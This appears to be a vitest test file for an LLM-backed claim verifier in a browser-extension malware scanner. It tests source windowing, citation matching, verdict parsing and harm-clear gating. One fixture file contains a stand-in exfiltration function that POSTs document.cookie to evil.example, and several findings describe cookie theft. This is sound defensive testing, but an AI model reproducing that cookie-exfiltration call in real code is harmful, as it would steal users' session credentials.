import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { FakeLlmClient } from "../src/llm/fake.ts";
import {
  extractSource,
  needleCandidates,
  parseVerifierVerdict,
  verifyClaim,
  verifyFindings,
  newSourceCaches,
  hasCausalClaim,
  demoteMischaracterizedCapabilities,
  isContentGrounded,
  reachabilityContextFromPack,
} from "../src/methodologies/claim-verifier.ts";
import type { Finding, EvidenceRef } from "../src/methodologies/findings.ts";

const ref = (over: Partial<EvidenceRef> = {}): EvidenceRef => ({
  file: "small.js",
  location: null,
  symbol: null,
  sink_or_string: null,
  ...over,
});

const finding = (over: Partial<Finding> = {}): Finding => ({
  id: "f1",
  title: "Cookie exfiltration",
  claim_type: "inferred-behavior",
  severity: "high",
  category: "data-exfiltration",
  finding_type: "unknown",
  confidence: "high",
  claimed_mechanism: "reads document.cookie and POSTs it to evil.example",
  evidence_refs: [ref()],
  detail: "claims the code sends cookies out",
  ...over,
});

const VERDICT_JSON = JSON.stringify({
  verdict: "refuted",
  grounding_line: { file: "small.js", line: 2 },
  rationale: "only reads exist",
  evidence_quote: "const c = document.cookie;",
});

// A synthetic extension dir: one small file, one >400-line file with a known
// function, one single-line "minified" file larger than the whole-file cap.
let dir: string;
beforeAll(() => {
  dir = mkdtempSync(join(tmpdir(), "claim-verifier-"));
  writeFileSync(join(dir, "small.js"), 'const c = document.cookie;\nconsole.log("len", c.length);\n');

  const filler = Array.from({ length: 450 }, (_, i) => `const filler_${i} = ${i};`);
  filler.splice(
    200,
    0,
    "function exfil() {",
    '  fetch("https://evil.example/x", { method: "POST", body: document.cookie });',
    "}",
  );
  writeFileSync(join(dir, "big.js"), filler.join("\n") + "\n");

  const pad = "var x = 1; ".repeat(4000); // ~44 KB on one line
  writeFileSync(join(dir, "minified.js"), `${pad}fetch("https://api.merchant.example/promo");${pad}\n`);

  // A bundle larger than PARSE_MAX_BYTES (2 MB). Babel must NOT be run on it —
  // an 8 MB minified file parses into a multi-hundred-MB AST that, retained in
  // caches.ast across a fan-out, OOMs the process (a real-world extension's failure).
  const huge = "var x = 1; ".repeat(240_000); // ~2.6 MB on one line
  writeFileSync(join(dir, "huge.js"), `${huge}fetch("https://api.merchant.example/promo");${huge}\n`);

  mkdirSync(join(dir, "nested"));
  writeFileSync(join(dir, "nested", "inner.js"), "const ok = true;\n");
  // A real binary asset carrying bytes past IEND — the shape Layer 2's
  // end-of-image anomaly cites. readFileSync(_, "utf8") on this does not throw.
  writeFileSync(
    join(dir, "asset.png"),
    Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.from([0x00, 0x00, 0x00, 0x00]),
      Buffer.from("IEND"),
      Buffer.from([0xae, 0x42, 0x60, 0x82]),
      Buffer.from("CFG1aGlkZGVu CFG1"),
    ]),
  );
});
afterAll(() => rmSync(dir, { recursive: true, force: true }));

describe("extractSource", () => {
  it("returns the whole file when it is small", () => {
    const win = extractSource(dir, ref({ file: "small.js" }))!;
    expect(win.content).toContain("document.cookie");
    expect(win.note).toContain("whole file");
  });

  it("windows a >400-line file to the enclosing function around the cited location", () => {
    // The exfil function body starts at line 202 (after 200 filler lines + the declaration).
    const win = extractSource(dir, ref({ file: "big.js", location: { line: 202, column: 2 } }))!;
    expect(win.content).toContain("function exfil");
    expect(win.content).toContain("evil.example");
    expect(win.content).not.toContain("filler_0 ="); // not the whole file
    expect(win.note).toContain("enclosing function");
  });

  it("falls back to locating by sink_or_string when no location is given", () => {
    const win = extractSource(dir, ref({ file: "big.js", sink_or_string: "evil.example" }))!;
    expect(win.content).toContain("evil.example");
  });

  it("falls back to a char window on a minified single-line file (no enclosing function)", () => {
    const win = extractSource(dir, ref({ file: "minified.js", sink_or_string: "api.merchant.example" }))!;
    expect(win.content).toContain("api.merchant.example");
    expect(win.content.length).toBeLessThan(5000);
    expect(win.note).toContain("window around cited line 1");
  });

  it("char-windows a file over the parse cap without ever building an AST (OOM guard)", () => {
    const caches = newSourceCaches();
    const win = extractSource(dir, ref({ file: "huge.js", sink_or_string: "api.merchant.example" }), caches)!;
    expect(win.content).toContain("api.merchant.example");
    expect(win.content.length).toBeLessThan(5000);
    expect(win.note).toContain("window");
    expect(win.note).not.toContain("enclosing function");
    // The giant file is cached as text but its AST slot is null — no parse ran.
    expect(caches.ast.size).toBe(1);
    expect([...caches.ast.values()][0]).toBeNull();
  });

  it("marks the window as insufficient when a big file has no resolvable location", () => {
    const win = extractSource(dir, ref({ file: "minified.js" }))!;
    expect(win.note).toContain("INSUFFICIENT");
  });

  it("returns null for missing files and traversal attempts", () => {
    expect(extractSource(dir, ref({ file: "ghost.js" }))).toBeNull();
    expect(extractSource(dir, ref({ file: "../outside.js" }))).toBeNull();
  });

  it("locates a decorated citation (kind prefix + quotes + trailing ellipsis) via needle fallbacks", () => {
    // The generator cites strings as `string literal: '…'` with elision — the
    // raw value never exact-matches the file (the real-world extension D f7 failure).
    const win = extractSource(
      dir,
      ref({ file: "minified.js", sink_or_string: "string literal: 'api.merchant.example/promo…'" }),
    )!;
    expect(win.content).toContain("api.merchant.example");
    expect(win.note).not.toContain("INSUFFICIENT");
  });

  it("rescues a mis-cited string from another file and calls out the mis-citation", () => {
    // Cited in the big minified file, but the string actually lives in small.js.
    const win = extractSource(
      dir,
      ref({ file: "minified.js", sink_or_string: "document.cookie" }),
      newSourceCaches(),
      ["small.js", "big.js"],
    )!;
    expect(win.file).toBe("small.js");
    expect(win.content).toContain("document.cookie");
    expect(win.note).toContain("cited minified.js, but the cited text was not found there");
    expect(win.note).toContain("found in small.js");
  });

  it("says so loudly when the cited text exists in NO file", () => {
    const win = extractSource(
      dir,
      ref({ file: "minified.js", sink_or_string: "totally-invented-evidence-string" }),
      newSourceCaches(),
      ["small.js", "big.js"],
    )!;
    expect(win.note).toContain("not found in it or in any other file");
    expect(win.note).toContain("INSUFFICIENT");
  });
});

describe("needleCandidates", () => {
  it("tries the raw value FIRST (existing exact matches keep their fixture-stable windows)", () => {
    expect(needleCandidates("x().management.setEnabled").strong[0]).toBe("x().management.setEnabled");
  });

  it("derives strong needles: quoted-span content, ellipsis-stripped, long-needle prefix", () => {
    const c = needleCandidates("string literal: 'Foo has set an affiliate cookie on this merchant because you activated…'").strong;
    expect(c).toContain("Foo has set an affiliate cookie on this merchant because you activated…");
    expect(c).toContain("Foo has set an affiliate cookie on this merchant because you activated");
    expect(c.some((n) => n === "Foo has set an affiliate cookie on this")).toBe(true); // 40-char prefix (trimmed)
  });

  it("keeps the quoted URL strong; the longest single token is a separate WEAK tier", () => {
    const c = needleCandidates('binding: "https://www.amazon.com/gp/buy/spc/handlers/add-giftcard-promotion.html"');
    expect(c.strong).toContain("https://www.amazon.com/gp/buy/spc/handlers/add-giftcard-promotion.html");
    // Prose with no quoted span only yields a weak token — common words like
    // "affiliate" match all over a bundle, so this tier must come last.
    const prose = needleCandidates("encodes affiliateTrackingCookie data");
    expect(prose.weak).toEqual(["affiliateTrackingCookie"]);
  });

  it("a strong needle found in ANOTHER file beats a weak token match in the cited file", () => {
    // The cited big.js contains the weak token ("document.cookie") but not the
    // full quoted string; small.js contains the actual cited line. The strong
    // cross-file rescue must win — a weak in-file hit would window the wrong
    // evidence (the real-world extension D f7 failure mode, second edition).
    const win = extractSource(
      dir,
      ref({ file: "big.js", sink_or_string: "string: 'const c = document.cookie;…'" }),
      newSourceCaches(),
      ["small.js"],
    )!;
    expect(win.file).toBe("small.js"); // strong cross-file rescue won
    expect(win.note).toContain("found in small.js");
  });
});

describe("parseVerifierVerdict", () => {
  it("parses a verdict and keeps the grounding line", () => {
    const v = parseVerifierVerdict(VERDICT_JSON, "f9");
    expect(v).toEqual({
      claim_id: "f9",
      verdict: "refuted",
      grounding_line: { file: "small.js", line: 2 },
      rationale: "only reads exist",
      evidence_quote: "const c = document.cookie;",
      harm_supported: null,
      harm_rationale: "",
      corrected_facts: [],
    });
  });

  it("last VALID verdict wins; invalid enums and scratch objects are skipped", () => {
    const text = `${JSON.stringify({ verdict: "confirmed", rationale: "draft" })}\n${JSON.stringify({ verdict: "maybe" })}`;
    expect(parseVerifierVerdict(text, "f1").verdict).toBe("confirmed");
  });

  it("maps an unparseable completion to inconclusive (never confirmed, never a crash)", () => {
    const v = parseVerifierVerdict("I think it's probably fine?", "f1");
    expect(v.verdict).toBe("inconclusive");
    expect(v.rationale).toContain("parseable verdict");
    expect(v.corrected_facts).toEqual([]);
  });

  // Improvement 020, Fix A — the verifier reports IOC mismatches it resolved from source.
  it("parses corrected_facts and drops malformed / no-op entries", () => {
    const text = JSON.stringify({
      verdict: "confirmed",
      rationale: "mechanism real; host mis-decoded",
      evidence_quote: "H(g(9)+g(11)+g(0)+'/upd2')",
      corrected_facts: [
        { claimed: "www.hotcleaner.com/upd2", actual: "api64.com/upd2" },
        { claimed: "same.com", actual: "same.com" }, // no-op — dropped
        { claimed: "onlyclaimed.com" }, // missing actual — dropped
        "junk", // not an object — dropped
      ],
    });
    const v = parseVerifierVerdict(text, "f1");
    expect(v.verdict).toBe("confirmed");
    expect(v.corrected_facts).toEqual([{ claimed: "www.hotcleaner.com/upd2", actual: "api64.com/upd2" }]);
  });

  it("defaults corrected_facts to [] when the verifier omits the field", () => {
    const v = parseVerifierVerdict(JSON.stringify({ verdict: "confirmed", rationale: "ok" }), "f1");
    expect(v.corrected_facts).toEqual([]);
  });
});

describe("verifyClaim", () => {
  it("wraps claim and source in the untrusted envelope, instructions first; sampleDir never enters the prompt", async () => {
    let prompt = "";
    const fake = new FakeLlmClient((req) => {
      prompt = req.prompt;
      return VERDICT_JSON;
    });
    const f = finding();
    const { verdict, usage } = await verifyClaim(f, f.evidence_refs, { sampleDir: dir, client: fake, model: "m" });

    expect(verdict.verdict).toBe("refuted");
    expect(usage.inputTokens).toBe(0);
    // Envelope contract: adversarial instructions precede the untrusted blocks.
    expect(prompt.indexOf("adversarially verifying")).toBeLessThan(prompt.indexOf("<claim>"));
    expect(prompt).toContain("<source>");
    expect(prompt).toContain("document.cookie");
    expect(prompt).toContain("needs-dynamic"); // the runtime-only guard is in the instructions
    // Label-leak guard: the on-disk location (tmpdir path) must never reach the model.
    expect(prompt).not.toContain(dir);
    // Request shape: deterministic + structured.
    expect(fake.calls[0]!.label).toBe("verify:claim");
    expect(fake.calls[0]!.params).toEqual({ temperature: 0, format: "json" });
  });

  it("includes correlated data_flows for cited files only", async () => {
    let prompt = "";
    const fake = new FakeLlmClient((req) => {
      prompt = req.prompt;
      return VERDICT_JSON;
    });
    const f = finding();
    await verifyClaim(f, f.evidence_refs, {
      sampleDir: dir,
      client: fake,
      model: "m",
      dataFlows: [
        { source_kind: "cookie", file: "small.js", sink_api: "fetch", sink_location: { line: 1 }, dest_host: "evil.example", dest_party: "external" },
        { source_kind: "storage", file: "other.js", sink_api: "fetch", sink_location: { line: 9 }, dest_host: "x.example", dest_party: "unknown" },
      ],
    });
    expect(prompt).toContain("correlated_data_flows");
    expect(prompt).toContain("evil.example");
    expect(prompt).not.toContain("x.example"); // flow for an uncited file stays out
  });
});

describe("verifyFindings (fan-out + gating)", () => {
  it("verifies only grounded inferred-behavior claims; observed-capability and ungrounded findings get no LLM call", async () => {
    const fake = new FakeLlmClient(() => ({ text: VERDICT_JSON, usage: { inputTokens: 7, outputTokens: 3 } }));
    const findings: Finding[] = [
      finding({ id: "behav" }),
      finding({ id: "cap", claim_type: "observed-capability" }),
      finding({ id: "invented", evidence_refs: [ref({ file: "ghost.js" })] }),
    ];
    const result = await verifyFindings(findings, { sampleDir: dir, client: fake, model: "m" });

    expect(fake.calls).toHaveLength(1);
    expect([...result.verdicts.keys()]).toEqual(["behav"]);
    expect(result.verdicts.get("behav")!.claim_id).toBe("behav");
    // Resolutions cover every finding (the renderer needs them all).
    expect([...result.resolutions.keys()].sort()).toEqual(["behav", "cap", "invented"]);
    expect(result.resolutions.get("invented")!.resolved).toHaveLength(0);
    expect(result.usage).toEqual({ inputTokens: 7, outputTokens: 3 });
  });

  it("sums usage across the fan-out", async () => {
    const fake = new FakeLlmClient(() => ({ text: VERDICT_JSON, usage: { inputTokens: 10, outputTokens: 4 } }));
    const findings = [finding({ id: "a" }), finding({ id: "b", evidence_refs: [ref({ file: "nested/inner.js" })] })];
    const result = await verifyFindings(findings, { sampleDir: dir, client: fake, model: "m" });
    expect(fake.calls).toHaveLength(2);
    expect(result.usage).toEqual({ inputTokens: 20, outputTokens: 8 });
  });
});

// Fix 2 — observed-capability findings get no LLM verifier, so a phantom (a
// citation whose sink_or_string is absent from source) must be caught with a
// deterministic content-grounding check, not asserted on file-existence alone.
describe("content-grounding for observed-capability findings (fix 2)", () => {
  const cap = (over: Partial<Finding> = {}): Finding =>
    finding({ claim_type: "observed-capability", claimed_mechanism: "", detail: "capability present", ...over });

  it("isContentGrounded: true when a cited string is present in source", () => {
    const f = cap({ evidence_refs: [ref({ file: "small.js", sink_or_string: "document.cookie" })] });
    expect(isContentGrounded(f, f.evidence_refs, dir, newSourceCaches())).toBe(true);
  });

  it("isContentGrounded: false when the cited string is absent (phantom)", () => {
    const f = cap({ evidence_refs: [ref({ file: "small.js", sink_or_string: "chrome.cookies.getAll(cb)" })] });
    expect(isContentGrounded(f, f.evidence_refs, dir, newSourceCaches())).toBe(false);
  });

  it("isContentGrounded: fails OPEN when no ref carries a checkable string (nothing to verify against)", () => {
    const f = cap({ evidence_refs: [ref({ file: "small.js", sink_or_string: null })] });
    expect(isContentGrounded(f, f.evidence_refs, dir, newSourceCaches())).toBe(true);
  });

  it("isContentGrounded: fails OPEN for a citation against a BINARY asset (byte-level evidence is unquotable)", () => {
    // Layer 2 emits "N bytes appended after the image/png end-of-image marker"
    // for a PNG. That sentence can never appear inside the PNG, and reading the
    // file as utf8 yields garbage rather than throwing — so without a binary
    // guard the citation looks checkable, matches nothing, and the finding is
    // wrongly discarded as a phantom.
    const f = cap({
      evidence_refs: [
        ref({
          file: "asset.png",
          sink_or_string: "56 bytes appended after the image/png end-of-image marker (hidden from decoders, readable at runtime)",
        }),
      ],
    });
    expect(isContentGrounded(f, f.evidence_refs, dir, newSourceCaches())).toBe(true);
  });

  it("isContentGrounded: a binary ref does not mask a real phantom in a TEXT ref alongside it", () => {
    const f = cap({
      evidence_refs: [
        ref({ file: "asset.png", sink_or_string: "56 bytes appended after the image/png end-of-image marker" }),
        ref({ file: "small.js", sink_or_string: "chrome.cookies.getAll(cb)" }),
      ],
    });
    expect(isContentGrounded(f, f.evidence_refs, dir, newSourceCaches())).toBe(false);
  });

  it("verifyFindings demotes a phantom observed-capability to ungrounded (classify then excludes it)", async () => {
    const fake = new FakeLlmClient(() => ({ text: VERDICT_JSON, usage: { inputTokens: 0, outputTokens: 0 } }));
    const phantom = cap({ id: "phantom", evidence_refs: [ref({ file: "small.js", sink_or_string: "chrome.cookies.getAll(cb)" })] });
    const real = cap({ id: "real", evidence_refs: [ref({ file: "small.js", sink_or_string: "document.cookie" })] });
    const result = await verifyFindings([phantom, real], { sampleDir: dir, client: fake, model: "m" });
    expect(result.resolutions.get("phantom")!.resolved).toHaveLength(0); // → unresolvable-evidence
    expect(result.resolutions.get("real")!.resolved.length).toBeGreaterThan(0); // stays asserted
    expect(fake.calls).toHaveLength(0); // observed-capabilities never hit the LLM
  });
});

// Improvement 016 — a causal claim wearing the observed-capability label is the
// one thing the verifier structurally never checks. Demote it before routing.
describe("demoteMischaracterizedCapabilities (016)", () => {
  const cap = (over: Partial<Finding> = {}): Finding =>
    finding({ claim_type: "observed-capability", claimed_mechanism: "", ...over });

  it("flags a capability whose detail asserts causal/runtime language", () => {
    const f = cap({ detail: "a Function() call that can execute arbitrary code strings passed at runtime" });
    expect(hasCausalClaim(f)).toBe(true);
    expect(demoteMischaracterizedCapabilities([f])).toEqual(["f1"]);
    expect(f.claim_type).toBe("inferred-behavior");
  });

  it("leaves a bare-presence capability alone", () => {
    const f = cap({ detail: "the chrome.cookies.getAll API is called at line 12, column 5" });
    expect(hasCausalClaim(f)).toBe(false);
    expect(demoteMischaracterizedCapabilities([f])).toEqual([]);
    expect(f.claim_type).toBe("observed-capability");
  });

  it("scans claimed_mechanism too, and matches attacker-capability framing", () => {
    const f = cap({ detail: "a message handler", claimed_mechanism: "allows any page to read extension storage" });
    expect(hasCausalClaim(f)).toBe(true);
  });

  it("does not touch findings already tagged inferred-behavior", () => {
    const f = finding({ claim_type: "inferred-behavior", detail: "can execute arbitrary code" });
    expect(demoteMischaracterizedCapabilities([f])).toEqual([]);
    expect(f.claim_type).toBe("inferred-behavior");
  });

  it("verifyFindings routes a demoted capability through the verifier, not the bare one", async () => {
    const fake = new FakeLlmClient(() => ({ text: VERDICT_JSON, usage: { inputTokens: 1, outputTokens: 1 } }));
    const causal = cap({ id: "causal", detail: "a Function() call that can execute arbitrary code passed at runtime" });
    const bare = cap({ id: "bare", detail: "the Function constructor is present at line 2" });
    const result = await verifyFindings([causal, bare], { sampleDir: dir, client: fake, model: "m" });
    expect([...result.verdicts.keys()]).toEqual(["causal"]);
    expect(causal.claim_type).toBe("inferred-behavior");
    expect(bare.claim_type).toBe("observed-capability");
  });
});

describe("harm adjudication (018 residual)", () => {
  const confirmedWithHarm = (harm: unknown) =>
    JSON.stringify({
      verdict: "confirmed",
      grounding_line: { file: "small.js", line: 1 },
      rationale: "mechanism real",
      evidence_quote: "const c = document.cookie;",
      harm_supported: harm,
      harm_rationale: "destinations are first-party telemetry",
    });

  const reachability = {
    externally_connectable: null,
    web_message_reachable: false,
    destinations: [{ host: "api.publisher.example", party: "first-party-extension" }],
    stated_purpose: { text: "Boosts tab volume", source: "manifest" as const },
  };

  it("parses harm_supported as a literal boolean only; anything else is null (fail-open)", () => {
    expect(parseVerifierVerdict(confirmedWithHarm(false), "f1").harm_supported).toBe(false);
    expect(parseVerifierVerdict(confirmedWithHarm(true), "f1").harm_supported).toBe(true);
    expect(parseVerifierVerdict(confirmedWithHarm("false"), "f1").harm_supported).toBeNull();
    expect(parseVerifierVerdict(VERDICT_JSON, "f1").harm_supported).toBeNull(); // legacy shape, no field
  });

  it("includes the reachability_context block only when the caller provides one", async () => {
    let prompt = "";
    const fake = new FakeLlmClient((req) => {
      prompt = req.prompt;
      return VERDICT_JSON;
    });
    const f = finding();
    await verifyClaim(f, f.evidence_refs, { sampleDir: dir, client: fake, model: "m" });
    expect(prompt).not.toContain("<reachability_context>"); // the block, not the instructions' mention of it
    await verifyClaim(f, f.evidence_refs, { sampleDir: dir, client: fake, model: "m", reachability });
    expect(prompt).toContain("<reachability_context>");
    expect(prompt).toContain("web_message_reachable");
    expect(prompt).toContain("api.publisher.example");
  });

  it("honors an explicit harm-clear on a non-malicious finding", async () => {
    const fake = new FakeLlmClient(() => confirmedWithHarm(false));
    const f = finding({ finding_type: "unknown" });
    const { verdict } = await verifyClaim(f, f.evidence_refs, { sampleDir: dir, client: fake, model: "m", reachability });
    expect(verdict.verdict).toBe("confirmed");
    expect(verdict.harm_supported).toBe(false);
  });

  it("never honors a harm-clear on a malicious finding — it can be refuted, not dismissed (data-exfiltration)", async () => {
    const fake = new FakeLlmClient(() => confirmedWithHarm(false));
    const f = finding({ finding_type: "malicious", category: "data-exfiltration", detail: "sends cookies to https://collect.evil.example/x" });
    const { verdict } = await verifyClaim(f, f.evidence_refs, { sampleDir: dir, client: fake, model: "m", reachability });
    expect(verdict.harm_supported).toBeNull(); // fail-open: the claim still asserts
    expect(verdict.harm_rationale).toContain("not honored");
  });

  it("never honors a harm-clear on a malicious finding even when the pack would corroborate it (unreachable messaging surface)", async () => {
    // mutant-a/e are malicious/critical exfil — this pins that a lenient or
    // prompt-injected harm-clear can never dismiss a malicious true positive.
    const fake = new FakeLlmClient(() => confirmedWithHarm(false));
    const f = finding({ finding_type: "malicious", category: "messaging-surface", detail: "onMessage handler trusts any sender" });
    const { verdict } = await verifyClaim(f, f.evidence_refs, { sampleDir: dir, client: fake, model: "m", reachability });
    expect(verdict.harm_supported).toBeNull();
  });

  it("never harm-clears a finding matching the remote-hosted-code floor shape (the Great-Suspender OWA hole)", async () => {
    // remote-resources / unwanted / high satisfies verdict.ts isRemoteHostedCode —
    // dismissing it would defeat the severity-gated floor 018 leaves untouched.
    const fake = new FakeLlmClient(() => confirmedWithHarm(false));
    const f = finding({ finding_type: "unwanted", category: "remote-resources", severity: "high", detail: "loads a remote analytics script into the background page" });
    const { verdict } = await verifyClaim(f, f.evidence_refs, { sampleDir: dir, client: fake, model: "m", reachability });
    expect(verdict.harm_supported).toBeNull(); // asserts + floors, not dismissed
  });

  it("still harm-clears a sub-floor non-remote-code finding (benign-extension-A-style credentialed fetch)", async () => {
    const fake = new FakeLlmClient(() => confirmedWithHarm(false));
    const f = finding({ finding_type: "unknown", category: "data-exfiltration", severity: "medium", detail: "content script fetches page resources with credentials" });
    const { verdict } = await verifyClaim(f, f.evidence_refs, { sampleDir: dir, client: fake, model: "m", reachability });
    expect(verdict.harm_supported).toBe(false); // cleared → dismissed
  });

  it("derives the reachability context deterministically from the pack", () => {
    const pack = {
      manifest_analysis: { externally_connectable: { matches: ["https://*.site.example/*"] } },
      cross_file: {
        data_flows: [
          { dest_host: "a.example", dest_party: "unknown" },
          { dest_host: "a.example", dest_party: "first-party-extension" }, // precedence over unknown
          { dest_host: "b.example", dest_party: "external" },
          { dest_host: null, dest_party: "external" }, // no host — ignored
        ],
      },
    } as unknown as Parameters<typeof reachabilityContextFromPack>[0];
    const ctx = reachabilityContextFromPack(pack, { text: "x".repeat(3000), source: "manifest" });
    expect(ctx.web_message_reachable).toBe(true);
    expect(ctx.destinations).toEqual([
      { host: "a.example", party: "first-party-extension" },
      { host: "b.example", party: "external" },
    ]);
    expect(ctx.stated_purpose!.text).toHaveLength(2000); // bounded like the synthesis digest
  });
});
